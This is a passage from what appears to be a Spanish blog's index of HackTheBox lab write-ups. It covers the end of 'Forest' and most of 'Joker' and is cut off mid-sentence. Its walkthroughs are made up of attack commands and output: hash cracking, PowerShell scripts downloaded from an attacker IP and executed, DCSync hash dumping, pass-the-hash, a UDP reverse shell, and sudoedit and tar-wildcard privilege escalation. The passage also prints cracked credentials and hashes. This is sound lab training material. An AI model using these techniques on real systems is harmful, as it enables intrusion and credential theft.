LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH setProcedemos a crackear el hash y obtenemos unas credenciales svc-alfresco:s3rvice ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuss3rvice     ($krb5asrep$23$svc-alfresco@HTB. LOCAL)1g 0:00:00:06 DONE (2023-10-11 14:27) 0. 1510g/s 617184p/s 617184c/s 617184C/s s521379846. . s3r2s1Use the  --show  option to display all of the cracked passwords reliablySession completedValidamos las credenciales y como el puerto 5985 se encuentra abierto podemos tratar de conectarnos por winrm ❯ crackmapexec winrm 10. 10. 10. 161 -u 'svc-alfresco' -p 's3rvice'SMB     10. 10. 10. 161  5985  FOREST      [*] Windows 10. 0 Build 14393 (name:FOREST) (domain:htb. local)HTTP    10. 10. 10. 161  5985  FOREST      [*] http://10. 10. 10. 161:5985/wsmanWINRM    10. 10. 10. 161  5985  FOREST      [+] htb. local\svc-alfresco:s3rvice (Pwn3d!)Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario svc-alfresco y podemos visualizar la primera flag user. txt ❯ evil-winrm -i 10. 10. 10. 161 -u 'svc-alfresco' -p 's3rvice'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpointEvil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoamihtb\svc-alfrescoEvil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd . . \DesktopEvil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; type user. txta5bdfec1b06f0a66536a4227d3dfc27dELEVACION DE PRIVILEGIOS #: Como nos enfrentamos a un DC vamos a usar BloodHound para tratar de enumerar vias potenciales para elevar nuestros privilegios. Para instalarlos solo debemos ejecutar: apt install neo4j, bloodhound -ySi tienes problemas con la instalación puedes instalar una versión especifica de neo4j de:  https://debian. neo4j. com/y puedes descargar un release de bloodhound directamente del repositorio de github:  BloodHound - releasesUna vez instalado ejecuta el comando neo4j console y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto neo4j:no4oj y te pedira cambies la contraseña por defecto a la que desees. ❯ neo4j consoleStarting Neo4j. 2023-10-11 20:21:29. 970+0000 INFO Starting. . . 2023-10-11 20:21:30. 757+0000 INFO This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)2023-10-11 20:21:33. 391+0000 INFO ======== Neo4j 4. 4. 26 ========2023-10-11 20:21:36. 106+0000 INFO Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED2023-10-11 20:21:36. 659+0000 INFO Bolt enabled on localhost:7687. 2023-10-11 20:21:37. 946+0000 INFO Remote interface available at http://localhost:7474/ Estas credenciales seran la que usaras para logearte al abrir Bloodhound.  Ahora descargaremos el script de powershell sharphound. ps1 que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al bloodhound.  SharpHound. ps1Subimos el script y lo interpretamos con Iex. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; mkdir bloodhound  Directory: C:\Users\svc-alfresco\DesktopMode        LastWriteTime     Length Name----        -------------     ------ ----d-----    10/11/2023  2:46 PM        bloodhoundEvil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; cd bloodhoundEvil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 10/SharpHound. ps1')Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Invoke-BloodHound -CollectionMethod AllEvil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; dir  Directory: C:\Users\svc-alfresco\Desktop\bloodhoundMode        LastWriteTime     Length Name----        -------------     ------ -----a----    10/11/2023  2:48 PM     15433 20231011144852_BloodHound. zip-a----    10/11/2023  2:48 PM     23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw. binNos traemos el archivo a nuestro equipo y lo importamos en el Bloodhound. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound. zip                    Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound. zip to 20231011144852_BloodHound. zip                    Info: Download successful!Le asignamos un nombre mas descriptivo al comprimido. ❯ ls 20231011144852_BloodHound. zip  hash  SharpHound. ps1  users❯ mv 20231011144852_BloodHound. zip bh_data. zip❯ ls bh_data. zip  hash  SharpHound. ps1  usersAhora lo subimos al BloodHound.  Como comprometimos al usuario svc-alfresco vamos a marcarlo como comprometido.  Vemos que el usuario alfresco esta dentro del grupo Account Operators y este tiene el privilegio GenericAll sobre Exchange Windows Permissions, que a su vez tiene WriteDacl sobre htb. local.  Estando dentro del grupo Account Operators podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo Exchange Windows Permissions. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net user fmiracle fmiracle123$! /add /domainThe command completed successfully. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net group  Exchange Windows Permissions  fmiracle /addThe command completed successfully. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net user fmiracleUser name          fmiracleFull NameCommentUser's commentCountry/region code     000 (System Default)Account active        YesAccount expires       NeverPassword last set      10/11/2023 3:29:16 PMPassword expires       NeverPassword changeable     10/12/2023 3:29:16 PMPassword required      YesUser may change password   YesWorkstations allowed     AllLogon scriptUser profileHome directoryLast logon          NeverLogon hours allowed     AllLocal Group MembershipsGlobal Group memberships   *Exchange Windows Perm*Domain UsersThe command completed successfully. Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio WriteDacl y ejecutar un Dcsync Attack, para ello ejecutamos los siguientes comandos. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -ForceEvil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; $Cred = New-Object System. Management. Automation. PSCredential('htb. local\fmiracle', $SecPassword)Despues vamos a descargarnos e importar el modulo de PowerView. ps1.  PowerView. ps1❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 161 - - [11/Oct/2023 17:32:48]  GET /PowerView. ps1 HTTP/1. 1  200 -Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 10/PowerView. ps1')Finalmente ejecutamos la función Add-DomainObjectAcl del PowerView. ps1 que importamos. Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity  DC=htb, DC=local  -PrincipalIdentity fmiracle -Rights DCSyncY ahora en nuestro equipo podemos usar secretdump usando las credenciales del usuario fmiracle y podemos dumpearnos todos los hashes del dominio. ❯ secretsdump. py htb. local/fmiracle@10. 10. 10. 161Impacket v0. 11. 0 - Copyright 2023 FortraPassword:[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid[*] Dumping Domain Credentials [*] Using the DRSUAPI method to get NTDS. DIT secrethtb. local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::htb. local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Aplicamos pass the hash con psexec. py para conectarnos como el usuario Administrator, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag root. txt. ❯ psexec. py htb. local/Administrator@10. 10. 10. 161 -hashes :32693b11e6aa90eb43d32c72a07ceea6Impacket v0. 11. 0 - Copyright 2023 Fortra[*] Requesting shares on 10. 10. 10. 161. . . . . [*] Found writable share ADMIN$[*] Uploading file bUDVoWTk. exe[*] Opening SVCManager on 10. 10. 10. 161. . . . . [*] Creating service jeFE on 10. 10. 10. 161. . . . . [*] Starting service jeFE. . . . . [!] Press help for extra shell commandsMicrosoft Windows [Version 10. 0. 14393](c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt; whoamint authority\systemC:\Windows\system32&gt; cd C:\Users\Administrator\DesktopC:\Users\Administrator\Desktop&gt; type root. txt84831d87fd5fe84052c8fb99dd4b9c5"
    }, {
    "id": 15,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Joker",
    "title": "Maquina Joker - htb writeup",
    "body": "2023/08/25 - El dia de hoy vamos a resolver Joker de hackthebox una maquina linux de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un squid proxy a traves del servicio tftp del protocolo udp, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas iptables definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario root y obtener acceso total al sistema. Maquina bastante guapa asi que a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Joker❯ ls JokerSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 21PING 10. 10. 10. 21 (10. 10. 10. 21) 56(84) bytes of data. 64 bytes from 10. 10. 10. 21: icmp_seq=1 ttl=63 time=106 ms--- 10. 10. 10. 21 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 105. 889/105. 889/105. 889/0. 000 msVemos que la maquina nos responde, con un ttl de 63 y por proximidad seria correspondiente a una maquina linux. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vv -n -Pn 10. 10. 10. 21 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-08-25 23:25 GMTInitiating SYN Stealth Scan at 23:25Scanning 10. 10. 10. 21 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 21Discovered open port 3128/tcp on 10. 10. 10. 21Completed SYN Stealth Scan at 23:25, 26. 44s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 21Host is up, received user-set (0. 12s latency). Scanned at 2023-08-25 23:25:26 GMT for 26sNot shown: 65533 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 633128/tcp open squid-http syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 53 seconds      Raw packets sent: 131087 (5. 768MB) | Rcvd: 21 (924B)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p22,3128 10. 10. 10. 21 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-08-25 23:26 GMTNmap scan report for 10. 10. 10. 21Host is up (0. 13s latency). PORT   STATE SERVICE  VERSION22/tcp  open ssh    OpenSSH 7. 3p1 Ubuntu 1ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)|  256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)|_ 256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)3128/tcp open http-proxy Squid http proxy 3. 5. 12|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/3. 5. 12Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21. 63 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 3p1 Ubuntu 1ubuntu0. 1       3128   SQUID-HTTP   http-proxy Squid   EXPLOTACION #: Comenzamos abriendo nuestro navegador y observamos el servicio correspondiente al puerto 3128.  Como vemos que se trata de un squid proxy podemos apoyarnos de nuestra extensión foxy proxy para agregar el proxy correspondiente a la maquina victima y asi intentar ver si al pasar con este nos muestra un contenido distinto.  Vemos que aun no podemos visualizar el contenido y que el servicio se queda cargando sin responder.  Ahora como vemos que se encuentra activo el squid proxy podemos intentar pasar a traves de este y intentar descubrir puertos internos de la maquina con la ayuda de wfuzz. ❯ wfuzz -c --hc=404 -t 20 --hh=3576 --hw=400 -z range,0-65535 -p 10. 10. 10. 21:3128:HTTP -u http://localhost:FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://localhost:FUZZ/Total requests: 65536=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000001:  400    151 L  416 W   3550 Ch    0                                                           000000022:  407    144 L  393 W   3590 Ch    21                                                          000000071:  407    144 L  393 W   3590 Ch    70                                                          000000211:  407    144 L  393 W   3594 Ch    210                                                          000000281:  407    144 L  393 W   3594 Ch    280                                                          000000489:  407    144 L  393 W   3594 Ch    488                                                          000000444:  407    144 L  393 W   3594 Ch    443                                                          000000592:  407    144 L  393 W   3594 Ch    591                                                          000000778:  407    144 L  393 W   3594 Ch    777 La herramienta nos reporta algunos posibles puertos que se encuentren activo de manera local, pero vimos que con nmap estos no se mostraban. Ahora si bien es cierto el puerto 21 no se encuentra externamente abierto, pero si consideramos los puertos por UDP tenemos al servicio tftp en el puerto 69. Si ahora tratamos con nmap de enumerar el puerto 69 por udp este se encuentra en esta filtered. ❯ nmap -p69 -sU 10. 10. 10. 21 -n -vStarting Nmap 7. 92 ( https://nmap. org ) at 2023-08-25 23:44 GMTInitiating Ping Scan at 23:44Scanning 10. 10. 10. 21 [4 ports]Completed Ping Scan at 23:44, 0. 12s elapsed (1 total hosts)Initiating UDP Scan at 23:44Scanning 10. 10. 10. 21 [1 port]Completed UDP Scan at 23:44, 1. 09s elapsed (1 total ports)Nmap scan report for 10. 10. 10. 21Host is up (0. 11s latency). PORT  STATE     SERVICE69/udp open|filtered tftpRead data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 1. 34 seconds      Raw packets sent: 6 (246B) | Rcvd: 4 (162B)Probamos a conectarnos al servicio y al intentar extraer alguna información nos responde con un mensjae de violación. ❯ tftp 10. 10. 10. 21tftp&gt; get /etc/passwdError code 2: Access violationtftp&gt; get /etc/Error code 2: Access violationtftp&gt;Como ya previamente sabemos que se esta ejecutando el servicio de squid proxy, podemos intentar traernos el archivo de configuración, que por defecto se encuentra en la ruta/etc/squid/squid. conf. ❯ tftp 10. 10. 10. 21tftp&gt; get /etc/squid/squid. confReceived 295428 bytes in 66. 4 secondstftp&gt;Conseguimos traernos el archivo y si ahora lo cateamos vemos un contenido interesante. ❯ ls squid. conf❯ /bin/cat squid. conf | grep -v  ^#  | sed '/^\s*$/d'acl SSL_ports port 443acl Safe_ports port 80		# httpacl Safe_ports port 21		# ftpacl Safe_ports port 443		# httpsacl Safe_ports port 70		# gopheracl Safe_ports port 210		# waisacl Safe_ports port 1025-65535	# unregistered portsacl Safe_ports port 280		# http-mgmtacl Safe_ports port 488		# gss-httpacl Safe_ports port 591		# filemakeracl Safe_ports port 777		# multiling httpacl CONNECT method CONNECThttp_access deny !Safe_portshttp_access deny CONNECT !SSL_portshttp_access deny managerauth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwordsauth_param basic realm kalamariacl authenticated proxy_auth REQUIREDhttp_access allow authenticatedhttp_access deny allhttp_port 3128coredump_dir /var/spool/squidrefresh_pattern ^ftp:		1440	20%	10080refresh_pattern ^gopher:	1440	0%	1440refresh_pattern -i (/cgi-bin/|\?) 0	0%	0refresh_pattern (Release|Packages(. gz)*)$   0    20%   2880refresh_pattern . 		0	20%	4320Podemos observar una ruta que contiene contraseñas, asi que vamos a proceder a traernos el archivo y obtenemos unas credenciales hasheadas. ❯ tftp 10. 10. 10. 21tftp&gt; get /etc/squid/passwordsReceived 48 bytes in 0. 1 seconds❯ /bin/cat passwordskalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph. l0Vamos a proceder a crackearlas con john y obtenemos unas credenciales validas kalamari:ihateseafood ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashWarning: detected hash type  md5crypt , but the string is also recognized as  md5crypt-long Use the  --format=md5crypt-long  option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusihateseafood   (kalamari)1g 0:00:00:19 DONE (2023-08-25 23:57) 0. 05173g/s 378636p/s 378636c/s 378636C/s ihateyou456!. . ihatepzUse the  --show  option to display all of the cracked passwords reliablySession completedYa que contamos con credenciales validas, podemos usarlas para el proxy que anteriormente agregamos.  Como ahora estamos pasando correctamente por el proxy, podemos enumerar los servicios de la maquina victima como si estuvieramos localmente. Si accedemos a nuestra ip local, vemos que en el puerto 80 hay un contenido diferente que corresponde a shorty url Ya que estamos en otro servicio, podemos enumerar rutas disponibles y esta vez emplearemos gobuster para hacerlo. ❯ gobuster dir -t 150 -u http://127. 0. 0. 1 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt --proxy http://kalamari:ihateseafood@10. 10. 10. 21:3128===============================================================Gobuster v3. 1. 0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:           http://127. 0. 0. 1[+] Method:         GET[+] Threads:         150[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt[+] Negative Status codes:  404[+] Proxy:          http://kalamari:ihateseafood@10. 10. 10. 21:3128[+] User Agent:       gobuster/3. 1. 0[+] Timeout:         10s===============================================================2023/08/26 00:11:32 Starting gobuster in directory enumeration mode===============================================================/list         (Status: 301) [Size: 251] [--&gt; http://127. 0. 0. 1/list/]/console       (Status: 200) [Size: 1479]Encontramos la ruta console y si vemos el contenido, tenemos acceso a una consola interactiva.  Si interactuamos vemos que podemos ejecutar comandos.  Si queremos enviarnos una conexión a nuestra maquina usando nc no tenemos exito, pero si visualizamos las reglas de conexión permitidas, observamos que solo estan permitidas las conexiones por tcp del puerto 22 y 3128 y al contrario por udp todas las conexiones estan permitidas.  '# Generated by iptables-save v1. 6. 0 on Fri May 19 18:01:16 2017*filter:INPUT DROP [41573:1829596]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [878:221932]-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT-A INPUT -i ens33 -p udp -j ACCEPT-A INPUT -i ens33 -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROPCOMMIT# Completed on Fri May 19 18:01:16 2017' Teniendo en cuenta que por udp todo esta permitido, vamos a mandarnos la conexión a traves de udp, solo debemos añadir el parametro -u.  Nos ponemos en escucha y recibimos la conexión. ❯ ncat -nlvp 443 -uNcat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 21. /bin/sh: 0: can't access tty; job control turned off$ whoamiwerkzeugLo que sigue como de costumbre es obtener una tty full interactiva. $ script /dev/null -c bashScript started, file is /dev/nullwerkzeug@joker:~$ ^Z   zsh: suspended ncat -nlvp 443 -u❯ stty raw -echo; fg[1] + continued ncat -nlvp 443 -u                  reset xtermwerkzeug@joker:~$ export term=XTERMwerkzeug@joker:~$ export shell=BASHwerkzeug@joker:~$ stty rows 45 columns 184Una vez en el sitema como el usuario werkzeug, vemos que tenemos asignado un permiso a nivel de sudoers donde podemos ejecutar el comando sudoedit como el usuario alekos sin proporcionar contraseña. werkzeug@joker:~$ sudo -lMatching Defaults entries for werkzeug on joker:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdirUser werkzeug may run the following commands on joker:  (alekos) NOPASSWD: sudoedit /var/www/*/*/layout. htmlObservamos que podemos ejecutar un archivo de nombre layout. html que se encuentra en cualquier directorio dentro de la ruta /var/www/* werkzeug@joker:~$ ls -ltotal 12-rwxr-x--- 1 root   werkzeug 581 May 18 2017 manage-shorty. pydrwxr-x--- 5 root   werkzeug 4096 May 18 2017 shortydrwxr-xr-x 2 werkzeug werkzeug 4096 May 18 2017 testingwerkzeug@joker:~$ cd testing/werkzeug@joker:~/testing$ lslayout. htmlVemos que dentro del directorio testing se encuentra un archivo layout. html, pero segun el privilegio que tenemos asignado el archivo layout. html debe encontrarse dentro de dos subdirectorios cualquiera. Y dado que tenemos permiso de escritura en testing, podemos crear dentro de este otro directorio y dentro el archivo layout. html. werkzeug@joker:~$ cd testing/werkzeug@joker:~/testing$ mkdir testwerkzeug@joker:~/testing$ cd !$cd testwerkzeug@joker:~/testing/test$ touch layout. htmlSi ahora usamos el comando sudoedit vemos que no nos pide proporcionar contraseña. werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout. html Unable to create directory /var/www/. nano: Permission deniedIt is required for saving/loading search history or cursor positions. Press Enter to continueAl ver esto, lo que podemos tratar de hacer es aprovecharnos de este permiso y aprovecharnos del principio basico de claves rsa, mediante el cual al creemos el archivo layout. html y que este sea un link simbolico a /home/alekos/. ssh/authorized_keys, donde al insertar nuestra clave publica como authorized_keys, podamos conectarnos sin necesidad de proporcionar una contraseña y al poder editar este archivo como el usuario alekos sera este el que ejecute la acción. De este modo sera como si estuvieramos insertando nuestra clave publica mediante el archivo layout. html a el directorio . ssh del usuario alekos. werkzeug@joker:~/testing/test$ ln -s -f /home/alekos/. ssh/authorized_keys layout. html werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout. html Unable to create directory /var/www/. nano: Permission deniedIt is required for saving/loading search history or cursor positions. Press Enter to continuewerkzeug@joker:~/testing/test$ cat layout. html ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYvqYRwqRrHydQfmmP56U9Wkec5IS2odMcoFxXppd5IPdzzf6CIv3skuKorlyi8HZCbsHnhm57Fqzn3PZWZ7pp5rgFzTPneh4a4W7NJONRxsuRwT4SWWNzmSjINyQrWurhctekrh3rRuhDwtSIz9rTjFKNCsmTbk6Qm3Fx3+JfYuKhuq4lNwSo3QqU2+yNv+svzzs66sdq+E/2Z0bhoi5bubhwj5g739A5odh57Hey9AfNtsK9vcVOpL+yH9RAwNHfRSHxM8GJrInMc3Twb9a8FQ8MSNO7gXd2+ykRqP0L8TkNJMggNTpmCZctL7a1wJHbTjcj68JO9nmFJgyh0BZQ8wlQetcDgo0yQ3jIhoIvN7GzPyJbo5X3cFhw/2gXSxWVLRwk6e7RQELp2SZeEFXN6ycimU4tbWEOrexJO2VwZQp8ZWv46ffUj4c4jYAiZ81i3wVJoko0uLcE9KENb/0E+9dnx5uMLUDNXz8x9EFwOkN1qxD3skGtR3dXMFZFRKM= root@fmiracleDe este modo ahora podemos conectarnos como el usuario alekos. ❯ ssh alekos@10. 10. 10. 21The authenticity of host '10. 10. 10. 21 (10. 10. 10. 21)' can't be established. ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k. Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10. 10. 10. 21' (ECDSA) to the list of known hosts. Welcome to Ubuntu 16. 10 (GNU/Linux 4. 8. 0-52-generic x86_64) * Documentation: https://help. ubuntu. com * Management:   https://landscape. canonical. com * Support:    https://ubuntu. com/advantage0 packages can be updated. 0 updates are security updates. Last login: Sat May 20 16:38:08 2017 from 10. 10. 13. 210alekos@joker:~$Ahora podemos dirigirnos a su directorio personal y visualizar la primera flag user. txt. alekos@joker:~$ lsbackup development user. txtalekos@joker:~$ cat user. txt fcbfa16ff0623562479c4a6a7e4897baELEVACION DE PRIVILEGIOS #: Listando el contenido del directorio de alekos, vemos dos directorio uno de development el cual contiene scripts en python y el directorio backup el cual contiene archivos comprimidos con tar. alekos@joker:~$ lsbackup development user. txtalekos@joker:~$ cd development/alekos@joker:~/development$ ls__init__. py application. py data models. py static templates utils. py views. pyalekos@joker:~/development$ cd . . alekos@joker:~$ cd backup/alekos@joker:~/backup$ lsdev-1514134201. tar. gz dev-1693005901. tar. gz dev-1693006801. tar. gz dev-1693007701. tar. gz dev-1693008601. tar. gz dev-1693009501. tar. gz dev-1693010402. tar. gzdev-1514134501. tar. gz dev-1693006201. tar. gz dev-1693007101. tar. gz dev-1693008001. tar. gz dev-1693008902. tar. gz dev-1693009801. tar. gz dev-1693010701. tar. gzdev-1693005601. tar. gz dev-1693006501. tar. gz dev-1693007401. tar. gz dev-1693008301. tar. gz dev-1693009201. tar. gz dev-1693010101. tar. gz dev-1693011002. tar. gzSi descomprimimos alguno de los comprimidos, obsevamos que dentro de este vemos los mismos archivos que se encontraban en la ruta development. Podemos intuir entonces que mediante una tarea que se ejecuta a intervalos regulares de tiempo, se esta comprimiendo todo el contenido del directorio development y lo esta almancenando en backup. alekos@joker:~/backup$ cp dev-1514134201. tar. gz /tmp/alekos@joker:~/backup$ cd /tmp/alekos@joker:/tmp$ lsdev-1514134201. tar. gz f systemd-private-67c5a0aba61c4233b0464cb22f25c7cb-systemd-timesyncd. service-5cvsvV vmware-rootalekos@joker:/tmp$ mkdir testalekos@joker:/tmp$ cd test/alekos@joker:/tmp/test$ mv . . /dev-1514134201. tar. gz . alekos@joker:/tmp/test$ tar -xf dev-1514134201. tar. gz alekos@joker:/tmp/test$ ls__init__. py application. py data dev-1514134201. tar. gz models. py static templates utils. py views. pyViendo esto lo mas probable es que se este usando tar, ejecutandolo de esta manera tar -cf /development/* y dado el caso podriamos aprovechar el uso de Wildcards y tratar de obtener una shell. Si usamos nuestra web de confianza:  gtfobins - tarVemos que para obtener una shell, podemos hacerlo con los siguientes parametros.  Y como se esta utilizando Wildcards, podemos crearnos dos archivos de nombre --checkpoint=1 y --checkpoint-action=exec=EJECUTA LO QUE QUIERAS. Para ello al crear los archivos que contienen -, debemos anteponer -- para hacerlo correctamente. En el segundo archivo que corresponde a la ejecución, voy a crearme un archivo en python el cual otorgue el permiso suid a la bash. alekos@joker:~/development$ cat abusing_wildcard. py import osos. system( chmod u+s /bin/bash )y seguidamente voy a crear los dos archivos necesarios, de modo que al ejecutarse el comando tar sobre todos los archivos tomara los nombres 